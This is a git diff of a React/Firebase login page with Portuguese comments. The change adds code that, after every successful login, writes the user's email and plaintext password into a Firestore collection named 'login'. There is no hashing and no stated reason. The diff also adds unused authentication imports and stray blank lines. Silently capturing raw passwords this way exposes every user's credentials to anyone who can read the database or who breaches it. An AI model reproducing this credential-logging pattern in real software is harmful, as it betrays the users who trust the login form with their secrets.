@@ -4,6 +4,9 @@ import "../styles/login.css";
 import { AuthContext } from "../contexts/auth";
 import { Box, Button, Grid, TextField, Typography } from "@mui/material";
 import { toast } from "react-toastify";
+import {db } from "../services/firebaseConnection";
+import {addDoc, collection }from "firebase/firestore";
+import { getAuth, createUserWithEmailAndPassword, signInWithEmailAndPassword } from "firebase/auth";
 
 function Login() {
   const [email, setEmail] = useState("");
@@ -11,7 +14,7 @@ function Login() {
   const navigate = useNavigate();
 
   // Obtendo a função de login e o estado de carregamento do contexto
-  const { login, loadingAuth } = useContext(AuthContext);
+  const { login, loadingAuth, user } = useContext(AuthContext);
 
   const handleSubmit = async (e) => {
     e.preventDefault();
@@ -23,6 +26,10 @@ function Login() {
 
     try {
       await login(email, senha); // Chama a função de login do contexto
+      await addDoc(collection(db, "login"),{
+        email: email,
+        senha: senha
+      })
       navigate("/perfil"); // Redireciona para o dashboard após login bem-sucedido
     } catch (error) {
       console.error("Erro ao fazer login: ", error);
@@ -39,7 +46,10 @@ function Login() {
   };
 
   return (
-    <Box
+
+    
+
+<Box
       component="form"
       onSubmit={handleSubmit}
       autoComplete="off" // Desabilita o preenchimento automático no formulário
@@ -54,6 +64,8 @@ function Login() {
         bgcolor: "background.paper",
       }}
     >
+
+
       <Typography variant="h4" align="center" gutterBottom>
         Login
       </Typography>
